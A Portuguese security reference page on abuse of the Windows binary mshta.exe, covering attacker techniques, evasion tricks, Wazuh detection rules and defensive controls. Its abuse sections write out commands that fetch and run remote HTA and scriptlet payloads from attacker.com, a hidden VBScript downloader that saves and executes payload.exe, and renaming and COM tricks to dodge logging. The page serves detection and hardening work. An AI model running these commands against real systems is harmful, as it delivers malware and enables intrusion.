# mshta.exe

**Plataforma:** Windows (todas as versões)

**Categorias:** Execução de código, Download, AWL Bypass, Proxy de execução

**MITRE ATT&CK:** T1218.005 (System Binary Proxy Execution — Mshta), T1105 (Ingress Tool Transfer)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Mshta/

---

## O que é o mshta.exe

O mshta.exe (Microsoft HTML Application Host) é o runtime do Windows para execução de arquivos HTA (HTML Application). Arquivos HTA são páginas HTML com acesso completo às APIs do Windows via ActiveX/COM — essencialmente aplicações web que rodam como aplicações nativas, fora do sandbox do navegador.

O mshta.exe interpreta HTML, JavaScript e VBScript com acesso irrestrito ao sistema de arquivos, registro, WMI e shell do Windows. Por ser assinado pela Microsoft e ser um componente legítimo do sistema, raramente é bloqueado por soluções de proteção baseadas em nome ou hash de binário.

---

## Por que atacantes usam o mshta.exe

O mshta.exe é amplamente usado em ataques de phishing e spear phishing. Um arquivo `.hta` anexado a um e-mail, ao ser aberto, executa com privilégios do usuário corrente e tem acesso completo ao sistema — não há sandbox como em navegadores modernos. Além disso, o mshta pode buscar e executar scripts remotamente, o que permite execução sem criar artefatos no disco.

---

## Técnicas de abuso

### Execução de arquivo HTA local

```cmd
:: Executar arquivo HTA local
mshta.exe C:\Users\Public\payload.hta

:: O arquivo .hta pode conter:
<script language="VBScript">
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "cmd.exe /c powershell.exe -enc <payload>", 0, False
  window.close
</script>
```

### Execução de HTA remoto (sem escrita em disco)

```cmd
:: Carregar e executar HTA diretamente da internet
mshta.exe http://attacker.com/payload.hta

:: Via HTTPS
mshta.exe https://attacker.com/payload.hta

:: Via compartilhamento UNC
mshta.exe \\attacker.com\share\payload.hta
```

### Execução de VBScript ou JavaScript inline

O mshta suporta execução de código diretamente na linha de comando, sem arquivo intermediário:

```cmd
:: VBScript inline
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c whoami"",0,True:Close")

:: JScript inline
mshta.exe javascript:a=(GetObject('script:http://attacker.com/payload.sct')).Exec();close();

:: VBScript com download e execução de payload
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc <payload>"",0,False:Close")
```

### Execução via protocolo about:

```cmd
mshta.exe "about:<script language='VBScript'>CreateObject(\"WScript.Shell\").Run \"cmd /c calc.exe\",0:Close</script>"
```

### Download de arquivo via HTA

Um arquivo HTA pode fazer download de outros payloads usando objetos ActiveX:

```vbscript
<script language="VBScript">
  Dim http, stream
  Set http = CreateObject("MSXML2.XMLHTTP")
  http.Open "GET", "http://attacker.com/payload.exe", False
  http.Send
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write http.responseBody
  stream.SaveToFile "C:\temp\payload.exe", 2
  stream.Close
  CreateObject("WScript.Shell").Run "C:\temp\payload.exe", 0
  window.close
</script>
```

---

## Técnicas de bypass e evasão

### Renomeação do binário

```cmd
copy C:\Windows\System32\mshta.exe C:\Windows\Temp\mscorsrv.exe
C:\Windows\Temp\mscorsrv.exe http://attacker.com/payload.hta
```

O `OriginalFileName` do PE continua sendo `MSHTA.EXE`, detectável via Sysmon.

### Uso de redirecionadores para ocultar URL de destino

```cmd
:: A URL visível no log é a do encurtador, não a do payload real
mshta.exe https://bit.ly/xxxxxxx
```

### Execução via COM Object

```powershell
# Via PowerShell, invocando mshta sem aparecer diretamente na linha de comando
$shell = New-Object -ComObject Shell.Application
$shell.ShellExecute("mshta.exe", "http://attacker.com/payload.hta", "", "open", 0)
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- mshta com URL HTTP/HTTPS como argumento — execução remota sem disco
- mshta com `vbscript:` ou `javascript:` inline — execução direta de código
- mshta iniciado como filho de processo Office ou cliente de e-mail (Outlook, Thunderbird)
- mshta iniciando conexão de rede (Sysmon Event ID 3)

**Indicadores de média relevância:**

- mshta carregando arquivo `.hta` de diretórios de usuário ou temporários
- mshta renomeado (verificar `OriginalFileName`)
- mshta com argumento `about:` com script inline

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<!-- mshta com URL remota -->
<rule id="100314" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)mshta\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)https?://</field>
  <description>mshta.exe carregando HTA remoto — execucao de codigo sem artefato em disco</description>
  <mitre>
    <id>T1218.005</id>
  </mitre>
</rule>

<!-- mshta com vbscript: ou javascript: inline -->
<rule id="100315" level="15">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)mshta\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(vbscript:|javascript:)</field>
  <description>mshta.exe executando script inline — execucao de codigo diretamente na linha de comando</description>
  <mitre>
    <id>T1218.005</id>
  </mitre>
</rule>

<!-- mshta iniciado por processo Office -->
<rule id="100316" level="15">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)mshta\.exe$</field>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)(WINWORD|EXCEL|OUTLOOK|POWERPNT)\.EXE$</field>
  <description>mshta.exe iniciado por aplicativo Office — possivel macro maliciosa</description>
  <mitre>
    <id>T1218.005</id>
    <id>T1566.001</id>
  </mitre>
</rule>

<!-- mshta renomeado -->
<rule id="100317" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)MSHTA\.EXE</field>
  <field name="win.eventdata.image" type="pcre2" negate="yes">(?i)mshta\.exe$</field>
  <description>mshta.exe executado com nome alterado — tentativa de evasao por renomeacao</description>
  <mitre>
    <id>T1036.003</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Aplicações legítimas que usam HTA:** algumas ferramentas de administração e instaladores mais antigos ainda usam arquivos HTA como interface. Esses casos geralmente envolvem arquivos HTA locais assinados em caminhos de `Program Files`, não URLs remotas. O uso de mshta com URL externa é praticamente sempre malicioso em ambientes corporativos modernos.

---

## Proteção e controles defensivos

**Desabilitar mshta via AppLocker ou WDAC:** na maioria dos ambientes corporativos modernos, não há necessidade legítima de executar arquivos HTA. Uma regra de AppLocker bloqueando `mshta.exe` para usuários não administrativos elimina praticamente todo o vetor de abuso.

**Regras ASR do Windows Defender:** a regra "Block execution of potentially obfuscated scripts" e "Block Office applications from creating child processes" cobrem indiretamente o mshta iniciado por macros.

**Bloqueio de extensão .hta em e-mail:** configure seu gateway de e-mail para bloquear anexos `.hta`. Em combinação com o bloqueio de mshta via AppLocker, elimina o vetor de phishing mais comum.

---

## Referências

- LOLBAS — mshta.exe: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
